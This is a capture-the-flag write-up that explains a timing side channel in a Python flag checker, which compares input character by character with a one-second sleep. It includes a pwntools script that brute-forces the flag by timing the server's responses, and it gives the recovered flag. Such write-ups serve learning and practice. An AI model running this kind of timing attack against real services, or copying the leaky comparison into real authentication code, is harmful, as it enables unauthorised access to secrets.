# Pwn 100 - Patience

Here we are given a netcat server and, presumably, the python code that is running on it:

```
Connect via nc 40.76.33.15 31337
```

```python2
#!/usr/bin/env python2
import sys
import time

if __name__ == '__main__':
    flag = '' # REDACTED

    print 'Can you beat the clock with this timing attack?'
    sys.stdout.flush()


    inp = sys.stdin.readline().strip()

    if len(flag) != len( inp ):
        exit('RIP, your flag is not the correct length!')

    for i in range(0, len(flag)):
        if flag[i] != inp[i]:
            exit('Wrong flag!')

        time.sleep(1)

    print 'Correct Flag!'
    sys.stdout.flush()
 ```
 
 Reading and reversing the python code, what it does is simple. It reads our input, then checks if the length of our input is the same length as the flag. If not, it exits. Otherwise, it checks our input with the flag sequentially starting from the first character. After each successful check, the program waits 1 second, otherwise it exits.
 
 The solution is simple: brute force every character, and if the program pauses for about an extra second, then we know the character we just tried is part of the flag.
 
 Next we just have to write a program to automate this. I chose to use python, pwntools, and elite haxor scripting skills:
 
 ```python
 from pwn import *
import time
import string

def trylen(flag):
	print "Try: " + flag
	r = remote("40.76.33.15", 31337)
	start = time.time()
	r.sendline(flag + "A"*(23-len(flag)))
	r.recvuntil("Wrong flag!", timeout=30)
	end = time.time()
	r.close()
	print end - start
	return end - start

print string.printable
flag = ""
curtime = trylen(flag)
print curtime
while True:
	for i in string.printable:
		test = trylen(flag + i)
		if abs(test - curtime) > 0.5:
			flag += i
			print flag
			curtime = trylen(flag)
			break
```

Note: this program took a long time to run because as we guess more characters, each subsequent attempt would take 1 second longer. So, when we brute approximately 100 characters for every value, well, you can imagine that it would take a while to finish.

## Flag
### b0ctf{ticky_t0cky_t0cz}
